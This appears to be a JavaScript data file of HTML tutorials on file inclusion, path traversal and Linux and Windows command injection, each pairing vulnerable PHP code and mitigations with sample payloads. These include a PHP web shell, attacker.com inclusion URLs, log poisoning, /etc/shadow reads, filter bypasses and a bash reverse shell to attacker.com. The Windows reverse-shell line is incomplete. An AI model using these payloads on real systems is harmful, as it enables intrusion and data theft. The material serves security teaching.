allVulnerabilities.push(
{
"id": 13,
    "title": "Remote File Inclusion (RFI)",
    "summary": `
        <p><b>Remote File Inclusion (RFI)</b> is a critical web vulnerability that allows attackers to include and execute remote files on a vulnerable server. This vulnerability commonly affects web applications that dynamically load files without properly validating user input.</p>

        <p>RFI vulnerabilities are especially dangerous because they may lead to Remote Code Execution (RCE), server compromise, web shell uploads, or complete control over the target system.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application accepts user-controlled input and directly includes files from external sources without proper validation.</p>

        <h3>Common Vulnerable Functions:</h3>

        <pre><code>include()
require()
include_once()
require_once()</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$page = $_GET['page'];

include($page);</code></pre>

        <p>The application directly includes files based on user input.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/index.php?page=http://attacker.com/shell.txt</code></pre>

        <p>If remote file inclusion is enabled, the server will fetch and execute the remote file.</p>

        <h3>Example of a Malicious Remote File:</h3>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <h3>Executing Commands:</h3>

        <pre><code>http://target.com/index.php?page=http://attacker.com/shell.txt&cmd=whoami</code></pre>

        <p>The attacker may execute operating system commands on the vulnerable server.</p>

        <h3>Why is RFI Dangerous?</h3>

        <p>Successful exploitation may allow attackers to upload web shells, execute remote commands, steal sensitive files, gain persistent access, or completely compromise the target server.</p>

        <h3>Requirements for RFI Exploitation:</h3>

        <pre><code>allow_url_include = On

allow_url_fopen = On</code></pre>

        <p>These PHP configurations allow remote files to be included from external URLs.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Code Execution (RCE).</p>
        <p>2. Uploading Web Shells.</p>
        <p>3. Stealing sensitive data.</p>
        <p>4. Privilege escalation.</p>
        <p>5. Full server takeover.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /index.php?page=http://attacker.com/shell.txt HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Payloads:</h3>

        <pre><code>http://attacker.com/shell.txt

https://evil.com/malicious.php

ftp://attacker.com/backdoor.txt</code></pre>

        <h3>Difference Between RFI and LFI:</h3>

        <p><b>RFI:</b> Includes remote files hosted on external servers.</p>

        <p><b>LFI:</b> Includes local files stored on the target server itself.</p>

        <h3>Example of Weak Filtering:</h3>

        <pre><code>if(page != "http://")</code></pre>

        <p>Attackers may bypass weak filtering using encoding or alternative protocols.</p>

        <h3>Protocol Wrapper Exploitation:</h3>

        <pre><code>php://input

data://

zip://</code></pre>

        <p>Attackers may abuse PHP wrappers to bypass restrictions or execute malicious code.</p>

        <h3>Common Indicators of RFI:</h3>

        <p>1. Dynamic file inclusion using user input.</p>
        <p>2. URL parameters controlling included files.</p>
        <p>3. Error messages related to include() or require().</p>
        <p>4. PHP warnings exposing file paths.</p>

        <h3>Testing for RFI:</h3>

        <pre><code>?page=http://example.com/test.txt</code></pre>

        <p>If the external content appears inside the application response, the application may be vulnerable.</p>

        <h3>Safe Example:</h3>

        <pre><code>// Secure Example

$pages = [
    "home" => "home.php",
    "about" => "about.php"
];

include($pages[$_GET['page']]);</code></pre>

        <p>The application uses a strict whitelist instead of direct user input.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Disable allow_url_include.</b></p>

        <p><b>2. Avoid direct file inclusion using user input.</b></p>

        <p><b>3. Use strict whitelist validation.</b></p>

        <p><b>4. Restrict accessible directories.</b></p>

        <p><b>5. Sanitize and validate all input.</b></p>

        <p><b>6. Disable dangerous PHP wrappers when unnecessary.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Disable remote includes

Use least privilege permissions

Monitor server logs

Apply Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may install malware, create backdoors, steal databases, pivot into internal networks, or completely destroy application integrity.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Remote File Inclusion is considered highly critical because it may directly lead to Remote Code Execution and full server compromise, especially on poorly configured PHP applications.</p>
    `
},

{
    "id": 14,
    "title": "Local File Inclusion (LFI)",
    "summary": `
        <p><b>Local File Inclusion (LFI)</b> is a dangerous web vulnerability that allows attackers to include and read files stored locally on the target server. This vulnerability usually occurs when web applications dynamically load files based on user input without proper validation.</p>

        <p>LFI vulnerabilities may lead to sensitive information disclosure, source code exposure, log poisoning, remote code execution, or complete server compromise under certain conditions.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application accepts user-controlled input and directly includes local files without validating the requested path.</p>

        <h3>Common Vulnerable Functions:</h3>

        <pre><code>include()
require()
include_once()
require_once()</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$page = $_GET['page'];

include($page);</code></pre>

        <p>The application includes files directly from user input.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/index.php?page=../../../../etc/passwd</code></pre>

        <p>The attacker attempts to read sensitive system files using directory traversal.</p>

        <h3>Common Sensitive Files:</h3>

        <pre><code>/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:\\Windows\\win.ini
C:\\boot.ini</code></pre>

        <h3>Why is LFI Dangerous?</h3>

        <p>Successful exploitation may allow attackers to read sensitive configuration files, obtain credentials, expose application source code, or even execute code using advanced exploitation techniques.</p>

        <h3>Directory Traversal Technique:</h3>

        <pre><code>../../../../</code></pre>

        <p>Attackers use directory traversal sequences to move outside the intended directory.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /index.php?page=../../../../etc/passwd HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Reading sensitive files.</p>
        <p>2. Accessing configuration files.</p>
        <p>3. Extracting credentials.</p>
        <p>4. Source code disclosure.</p>
        <p>5. Achieving Remote Code Execution.</p>

        <h3>Log Poisoning Technique:</h3>

        <p>Attackers may inject PHP code into log files and later include them through the LFI vulnerability.</p>

        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <h3>Example of Log Poisoning:</h3>

        <pre><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <p>The attacker later accesses:</p>

        <pre><code>http://target.com/index.php?page=/var/log/apache2/access.log&cmd=whoami</code></pre>

        <h3>PHP Wrappers Exploitation:</h3>

        <pre><code>php://filter

php://input

data://</code></pre>

        <p>PHP wrappers may help attackers read source code or execute malicious input.</p>

        <h3>Reading Source Code:</h3>

        <pre><code>php://filter/convert.base64-encode/resource=index.php</code></pre>

        <p>The application source code may be displayed in Base64 format.</p>

        <h3>Null Byte Injection:</h3>

        <pre><code>../../../../etc/passwd%00</code></pre>

        <p>Older systems may truncate the filename after the null byte.</p>

        <h3>Common Indicators of LFI:</h3>

        <p>1. Dynamic file inclusion parameters.</p>
        <p>2. Error messages exposing file paths.</p>
        <p>3. URL parameters controlling file loading.</p>
        <p>4. Inclusion of local templates or pages.</p>

        <h3>Weak Filtering Example:</h3>

        <pre><code>str_replace("../", "", input)</code></pre>

        <p>Attackers may bypass weak filtering using encoding or alternative traversal patterns.</p>

        <h3>Common Bypass Techniques:</h3>

        <pre><code>....//

..%2f

%252e%252e%252f</code></pre>

        <h3>Safe Example:</h3>

        <pre><code>// Secure Example

$pages = [
    "home" => "home.php",
    "about" => "about.php"
];

include($pages[$_GET['page']]);</code></pre>

        <p>The application uses a strict whitelist instead of direct user input.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Avoid direct file inclusion from user input.</b></p>

        <p><b>2. Use whitelist validation.</b></p>

        <p><b>3. Restrict accessible directories.</b></p>

        <p><b>4. Sanitize and validate all paths.</b></p>

        <p><b>5. Disable unnecessary PHP wrappers.</b></p>

        <p><b>6. Restrict file permissions.</b></p>

        <p><b>7. Hide detailed error messages.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Use least privilege permissions

Disable dangerous functions

Monitor logs continuously

Apply Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Difference Between LFI and RFI:</h3>

        <p><b>LFI:</b> Includes local files already stored on the target server.</p>

        <p><b>RFI:</b> Includes remote files hosted on external servers.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal sensitive credentials, access application secrets, execute malicious code, compromise servers, or pivot deeper into internal infrastructure.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Local File Inclusion is highly critical because it may expose sensitive system files and, in advanced exploitation scenarios, lead to Remote Code Execution and complete server compromise.</p>
    `
},


{
    "id": 15,
    "title": "Directory Traversal Attack",
    "summary": `
        <p><b>Directory Traversal Attack</b>, also known as <b>Path Traversal</b>, is a dangerous web vulnerability that allows attackers to access files and directories outside the intended web application directory.</p>

        <p>This vulnerability occurs when applications use user-controlled input to access files on the server without properly validating or sanitizing the requested path.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when an application directly uses user input in file paths.</p>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$file = $_GET['file'];

include("pages/" . $file);</code></pre>

        <p>The application assumes the user will only request files from the pages directory.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/index.php?file=../../../../etc/passwd</code></pre>

        <p>The attacker escapes the intended directory and accesses sensitive system files.</p>

        <h3>Common Traversal Sequences:</h3>

        <pre><code>../

..\\

....//

..%2f

%252e%252e%252f</code></pre>

        <h3>Why is Directory Traversal Dangerous?</h3>

        <p>Successful exploitation may allow attackers to read configuration files, access credentials, expose source code, retrieve sensitive logs, or gain information useful for further attacks.</p>

        <h3>Common Sensitive Files:</h3>

        <pre><code>/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:\\Windows\\win.ini
C:\\boot.ini</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /download?file=../../../../etc/passwd HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Directory Traversal on Windows:</h3>

        <pre><code>..\\..\\..\\Windows\\win.ini</code></pre>

        <p>Windows systems may use backslashes instead of forward slashes.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Reading sensitive files.</p>
        <p>2. Accessing configuration files.</p>
        <p>3. Extracting credentials.</p>
        <p>4. Source code disclosure.</p>
        <p>5. Gathering information for further exploitation.</p>

        <h3>Weak Filtering Example:</h3>

        <pre><code>str_replace("../", "", input)</code></pre>

        <p>Attackers may bypass weak filtering using encoding or alternative traversal patterns.</p>

        <h3>Encoding Bypass Techniques:</h3>

        <pre><code>..%2f

%2e%2e%2f

%252e%252e%252f</code></pre>

        <h3>Double Traversal Bypass:</h3>

        <pre><code>....//....//etc/passwd</code></pre>

        <p>Some filters fail to detect modified traversal patterns.</p>

        <h3>Null Byte Injection:</h3>

        <pre><code>../../../../etc/passwd%00</code></pre>

        <p>Older systems may stop processing the path after the null byte.</p>

        <h3>Indicators of Directory Traversal:</h3>

        <p>1. File download functionality.</p>
        <p>2. Dynamic file loading.</p>
        <p>3. URL parameters controlling file paths.</p>
        <p>4. Error messages exposing server paths.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>File download systems

Template loaders

Image viewers

Log viewers

Backup download pages</code></pre>

        <h3>Example of Secure Validation:</h3>

        <pre><code>// Secure Example

$allowed = [
    "home.html",
    "about.html"
];

if(in_array($file, $allowed)) {
    include($file);
}</code></pre>

        <p>The application uses strict whitelist validation.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use whitelist validation for file access.</b></p>

        <p><b>2. Sanitize and validate all user input.</b></p>

        <p><b>3. Restrict access to sensitive directories.</b></p>

        <p><b>4. Avoid direct file path usage from user input.</b></p>

        <p><b>5. Normalize file paths before processing.</b></p>

        <p><b>6. Hide detailed server error messages.</b></p>

        <p><b>7. Apply least privilege permissions.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict filesystem permissions

Disable directory listing

Use chroot jails

Monitor server logs

Apply Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
Nuclei
Metasploit</code></pre>

        <h3>Difference Between Directory Traversal and LFI:</h3>

        <p><b>Directory Traversal:</b> Focuses on accessing unauthorized files through path manipulation.</p>

        <p><b>LFI:</b> Focuses on including local files into application execution.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may expose passwords, database credentials, application secrets, source code, or internal server information that can lead to deeper compromise.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Directory Traversal is considered highly dangerous because it may expose critical system files and sensitive application data, potentially leading to complete server compromise when combined with other vulnerabilities.</p>
    `
},


{
    "id": 16,
    "title": "Linux Command Injection",
    "summary": `
        <p><b>Linux Command Injection</b> is a critical vulnerability that allows attackers to execute operating system commands on a Linux server through vulnerable applications.</p>

        <p>This vulnerability occurs when applications pass user-controlled input directly into system commands without proper sanitization or validation.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when an application constructs shell commands using unsafe user input.</p>

        <h3>Common Dangerous Functions:</h3>

        <pre><code>system()
exec()
shell_exec()
passthru()
popen()</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$ip = $_GET['ip'];

system("ping -c 1 " . $ip);</code></pre>

        <p>The application directly inserts user input into a Linux command.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/ping.php?ip=127.0.0.1;whoami</code></pre>

        <p>The server executes both the ping command and the injected whoami command.</p>

        <h3>Common Command Separators:</h3>

        <pre><code>;
&&
||
|
$( )
\` \`</code></pre>

        <h3>Why is Command Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to execute arbitrary Linux commands, steal sensitive data, create backdoors, escalate privileges, or fully compromise the server.</p>

        <h3>Common Linux Commands Used by Attackers:</h3>

        <pre><code>whoami
id
uname -a
pwd
ls
cat /etc/passwd</code></pre>

        <h3>Example Using && Operator:</h3>

        <pre><code>127.0.0.1 && id</code></pre>

        <h3>Example Using Pipe Operator:</h3>

        <pre><code>127.0.0.1 | whoami</code></pre>

        <h3>Command Substitution Example:</h3>

        <pre><code>127.0.0.1$(whoami)</code></pre>

        <p>The shell executes the command inside the substitution syntax.</p>

        <h3>Blind Command Injection:</h3>

        <p>Sometimes command output is not visible directly in the response.</p>

        <pre><code>127.0.0.1; sleep 10</code></pre>

        <p>If the server response delays, the injection may be successful.</p>

        <h3>Out-of-Band Exploitation:</h3>

        <pre><code>127.0.0.1; nslookup attacker.com</code></pre>

        <p>The attacker monitors external DNS or HTTP requests to confirm code execution.</p>

        <h3>Reverse Shell Example:</h3>

        <pre><code>bash -i >& /dev/tcp/attacker.com/4444 0>&1</code></pre>

        <p>The attacker may gain interactive shell access to the server.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /ping.php?ip=127.0.0.1;id HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Command Execution.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Stealing sensitive files.</p>
        <p>4. Installing malware or backdoors.</p>
        <p>5. Full server compromise.</p>

        <h3>Indicators of Command Injection:</h3>

        <p>1. User input passed into shell commands.</p>
        <p>2. Unexpected command output in responses.</p>
        <p>3. Delayed server responses.</p>
        <p>4. Application interaction with system utilities.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Ping utilities

Traceroute tools

Backup systems

File conversion tools

Network diagnostic utilities</code></pre>

        <h3>Weak Filtering Example:</h3>

        <pre><code>str_replace(";", "", input)</code></pre>

        <p>Attackers may bypass weak filtering using alternative separators or encoding techniques.</p>

        <h3>Bypass Techniques:</h3>

        <pre><code>&&
||
$(whoami)
\`id\`
%0a</code></pre>

        <h3>Example of Safe Code:</h3>

        <pre><code>// Secure Example

$ip = escapeshellarg($_GET['ip']);

system("ping -c 1 " . $ip);</code></pre>

        <p>The application sanitizes shell arguments before execution.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Avoid direct shell command execution.</b></p>

        <p><b>2. Validate and sanitize all user input.</b></p>

        <p><b>3. Use safe APIs instead of shell commands.</b></p>

        <p><b>4. Apply least privilege permissions.</b></p>

        <p><b>5. Use escapeshellarg() and escaping mechanisms.</b></p>

        <p><b>6. Disable unnecessary system utilities.</b></p>

        <p><b>7. Monitor server logs for suspicious activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Use containers or sandboxes

Restrict shell access

Disable dangerous functions

Apply Web Application Firewall (WAF)

Monitor process execution</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Commix
Nuclei
Metasploit</code></pre>

        <h3>Difference Between Command Injection and Code Injection:</h3>

        <p><b>Command Injection:</b> Executes operating system commands.</p>

        <p><b>Code Injection:</b> Executes application-level code such as PHP or JavaScript.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal sensitive information, deploy ransomware, create persistent backdoors, move laterally through networks, or completely destroy system integrity.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Linux Command Injection is considered extremely critical because successful exploitation may directly lead to Remote Code Execution and full server compromise.</p>
    `
},


{
    "id": 17,
    "title": "OS Command Injection in Windows",
    "summary": `
        <p><b>OS Command Injection in Windows</b> is a critical vulnerability that allows attackers to execute Windows operating system commands through vulnerable applications.</p>

        <p>This vulnerability occurs when applications pass user-controlled input directly into Windows shell commands without proper validation or sanitization.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application builds system commands using unsafe user input.</p>

        <h3>Common Dangerous Functions:</h3>

        <pre><code>system()
exec()
shell_exec()
popen()
Runtime.exec()</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>// PHP Example

$ip = $_GET['ip'];

system("ping " . $ip);</code></pre>

        <p>The application directly inserts user input into a Windows command.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/ping.php?ip=127.0.0.1 & whoami</code></pre>

        <p>The server executes both the ping command and the injected whoami command.</p>

        <h3>Common Windows Command Separators:</h3>

        <pre><code>&
&&
||
|</code></pre>

        <h3>Why is OS Command Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to execute arbitrary Windows commands, steal sensitive data, create backdoors, escalate privileges, or completely compromise the server.</p>

        <h3>Common Windows Commands Used by Attackers:</h3>

        <pre><code>whoami
ipconfig
dir
type
net user
tasklist</code></pre>

        <h3>Example Using && Operator:</h3>

        <pre><code>127.0.0.1 && dir</code></pre>

        <h3>Example Using Pipe Operator:</h3>

        <pre><code>127.0.0.1 | whoami</code></pre>

        <h3>Blind Command Injection:</h3>

        <p>Sometimes the application does not display command output directly.</p>

        <pre><code>127.0.0.1 & ping -n 10 127.0.0.1</code></pre>

        <p>If the response is delayed, the injection may be successful.</p>

        <h3>Out-of-Band Exploitation:</h3>

        <pre><code>127.0.0.1 & nslookup attacker.com</code></pre>

        <p>The attacker monitors external DNS requests to confirm code execution.</p>

        <h3>PowerShell Exploitation:</h3>

        <pre><code>powershell -c whoami</code></pre>

        <p>Attackers often abuse PowerShell to execute advanced commands.</p>

        <h3>Reverse Shell Example:</h3>

        <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass</code></pre>

        <p>The attacker may establish remote interactive access to the system.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /ping.php?ip=127.0.0.1 & whoami HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote Command Execution.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Stealing sensitive files.</p>
        <p>4. Installing malware or ransomware.</p>
        <p>5. Full server compromise.</p>

        <h3>Indicators of OS Command Injection:</h3>

        <p>1. User input passed into system commands.</p>
        <p>2. Unexpected command output in responses.</p>
        <p>3. Delayed responses during testing.</p>
        <p>4. Application interaction with operating system utilities.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Ping utilities

Network diagnostic tools

Backup systems

File management tools

Administrative panels</code></pre>

        <h3>Weak Filtering Example:</h3>

        <pre><code>str_replace("&", "", input)</code></pre>

        <p>Attackers may bypass weak filtering using alternative separators or encoded payloads.</p>

        <h3>Common Bypass Techniques:</h3>

        <pre><code>&&
||
%0a
^
PowerShell payloads</code></pre>

        <h3>Example of Safe Code:</h3>

        <pre><code>// Secure Example

$ip = escapeshellarg($_GET['ip']);

system("ping " . $ip);</code></pre>

        <p>The application sanitizes shell arguments before execution.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Avoid direct execution of system commands.</b></p>

        <p><b>2. Validate and sanitize all user input.</b></p>

        <p><b>3. Use safe APIs instead of shell execution.</b></p>

        <p><b>4. Apply least privilege permissions.</b></p>

        <p><b>5. Restrict PowerShell usage when unnecessary.</b></p>

        <p><b>6. Disable dangerous functions.</b></p>

        <p><b>7. Monitor logs for suspicious command execution.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict command execution

Use Windows Defender

Apply Application Whitelisting

Monitor PowerShell activity

Apply Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Commix
Nuclei
Metasploit</code></pre>

        <h3>Difference Between Linux and Windows Command Injection:</h3>

        <p><b>Linux Injection:</b> Uses Linux shell commands and separators.</p>

        <p><b>Windows Injection:</b> Uses CMD or PowerShell commands and Windows-specific syntax.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may deploy malware, steal credentials, move laterally across networks, disable security controls, or completely compromise Windows servers.</p>

        <h3>Vulnerability Severity:</h3>

        <p>OS Command Injection in Windows is considered extremely critical because successful exploitation may directly lead to Remote Code Execution and complete system takeover.</p>
    `
},


);
